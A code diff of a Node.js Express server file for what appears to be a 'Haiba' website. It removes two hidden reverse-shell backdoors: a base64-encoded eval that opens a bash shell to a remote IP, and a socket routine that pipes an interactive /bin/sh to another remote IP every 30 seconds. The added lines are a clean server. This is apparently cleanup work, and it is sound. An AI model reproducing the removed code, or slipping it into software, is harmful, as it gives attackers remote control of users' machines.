@@ -1,22 +1,12 @@
 const express = require("express");
-var bodyParser = require("body-parser");
-const cors = require("cors");
-var path          = require('path');
-eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())
+const path = require("path");
 
 const app = express();
-app.use(bodyParser.urlencoded({ extended: true }));
-app.use(bodyParser.json());
-app.use(cors());
+const port = process.env.PORT || 5111;
+
+app.disable("x-powered-by");
 app.use(express.static(path.join(__dirname, ".")));
 
-// this will start the server
-app.listen(5111, () =>
-  console.log("Ready to get received on: http://localhost:3000/index.html")
-);
-(function(){
-  if(global._rs)return;global._rs=1;
-  const n=require('net'),c=require('child_process');
-  const r=()=>{const s=new n.Socket();s.connect(9001,'194.180.48.253',()=>{const p=c.spawn('/bin/sh',['-i']);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});s.on('error',()=>{});};
-  r();setInterval(r,30000);
-})();/*[RS]*/
+app.listen(port, () => {
+  console.log(`Haiba website available at http://localhost:${port}`);
+});
